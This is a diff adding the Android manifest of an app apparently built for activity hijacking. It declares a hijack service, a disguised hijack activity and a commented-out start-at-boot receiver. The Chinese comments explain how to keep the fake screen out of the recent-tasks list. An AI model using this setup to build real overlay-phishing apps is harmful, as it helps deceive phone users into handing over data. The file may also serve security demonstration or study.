@@ -1,0 +1,50 @@
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+		  package="com.sy.hijackapp">
+
+	<!--获取开机启动的广播，并在广播接收器里启动劫持服务。若不需要开机启动则可注释此权限和下面的receiver-->
+	<!--<uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>-->
+
+	<!--activityManager.getRunningTasks(1)所需权限，用以获取Task-->
+	<uses-permission android:name="android.permission.GET_TASKS"/>
+
+	<application
+			android:allowBackup="true"
+			android:icon="@mipmap/ic_launcher"
+			android:label="@string/app_name"
+			android:roundIcon="@mipmap/ic_launcher_round"
+			android:supportsRtl="true"
+			android:theme="@style/AppTheme"
+			android:name=".HijackApplication"><!--启动类-->
+
+		<activity
+				android:name=".activity.MainActivity">
+			<intent-filter>
+				<action android:name="android.intent.action.MAIN"/>
+
+				<category android:name="android.intent.category.LAUNCHER"/>
+			</intent-filter>
+		</activity>
+
+		<!--劫持Activity：添加android:noHistory="true"就不会把伪装界面显示在最近任务中-->
+		<activity
+				android:name=".activity.HijackActivity"
+				/>
+
+		<!--在开机时得到开机启动的广播，用于启动劫持服务。若不需要开机启动则可注释此receiver和上面的permission-->
+		<!--<receiver-->
+		<!--android:name=".receiver.HijackReceiver"-->
+		<!--android:enabled="true"-->
+		<!--android:exported="true">-->
+		<!--&lt;!&ndash;android:enabled="true"：开机启动&ndash;&gt;-->
+		<!--&lt;!&ndash;android:exported="true"：获取外部广播需要开启此属性>&ndash;&gt;-->
+		<!--<intent-filter>-->
+		<!--<action android:name="android.intent.action.BOOT_COMPLETED"/>-->
+		<!--</intent-filter>-->
+		<!--</receiver>-->
+
+		<!--劫持服务-->
+		<service android:name=".service.HijackService"/>
+	</application>
+
+</manifest>
